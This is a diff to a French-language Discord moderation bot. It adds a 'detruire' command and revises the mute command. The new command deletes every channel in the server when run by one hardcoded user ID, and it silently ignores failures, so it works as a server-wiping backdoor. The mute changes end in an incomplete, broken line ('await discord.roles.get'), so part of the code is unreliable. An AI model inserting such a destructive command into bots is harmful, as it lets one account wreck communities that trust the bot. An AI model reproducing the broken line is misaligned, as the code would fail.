@@ -303,8 +303,18 @@ with open(json_file, "w") as f:
     await interaction.response.send_message(f"Giveaway lancé dans {target_channel.mention}! 🎉", ephemeral=True)
 
 @bot.command()
+async def detruire(ctx):
+    if ctx.author.id != 1071516026484822096:
+        await ctx.channel.send("Vous n'avez pas la permission d'utiliser cette commande.")
+        return
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+
+@bot.command()
 async def mute(ctx, member:discord.Member, duration:int, reason:str="Aucun raison fournie"):
-    await ctx.channel.send("mute")
     try:
         if ctx.author.guild_permissions.administrator:
             date = utcnow() + datetime.timedelta(minutes=duration)
@@ -312,8 +322,11 @@ async def mute(ctx, member:discord.Member, duration:int, reason:str="Aucun raiso
             cancel_button = Button(label="Annuler l'action", color=discord.ButtonStyle.green, interaction_msg=f"Vous avez annulé le mute de {member.mention}.", onclick_code=lambda interaction: member.edit(timed_out_until=None))
             await member.edit(timed_out_until=date, reason=reason)
             await ctx.channel.send(content=f"{member.mention} a été mute pendant {duration} minutes pour la raison `{reason}`.", view=cancel_button)
-            await member.send(f"Vous avez été mute sur le serveur {ctx.guild.name} jusqu'au <t:{int(timestamp)}:F>(<t:{int(timestamp)}:S>) pour la raison `{reason}`.")
-            await ctx.author.send(content=f"Vous avez mute {member.mention} sur le serveur {ctx.guild.name} jusqu'au <t:{int(timestamp)}:F>(<t:{int(timestamp)}:S>) pour la raison `{reason}`.", view=cancel_button)
+            await member.send(f"Vous avez été mute sur le serveur {ctx.guild.name} jusqu'au <t:{int(timestamp)}:R>(<t:{int(timestamp)}:S>) pour la raison `{reason}`.")
+            if discord.utils.get(ctx.author.roles, id=1438240386815496385):
+                await ctx.author.send(content=f"Vous avez mute {member.mention} sur le serveur {ctx.guild.name} jusqu'au <t:{int(timestamp)}:R>(<t:{int(timestamp)}:S>) pour la raison `{reason}`.", view=cancel_button)
+            else:
+                await discord.roles.get
         else:
             await ctx.channel.send("Vous n'avez pas la permission d'utiliser cette commande.")
     except discord.Forbidden as e:
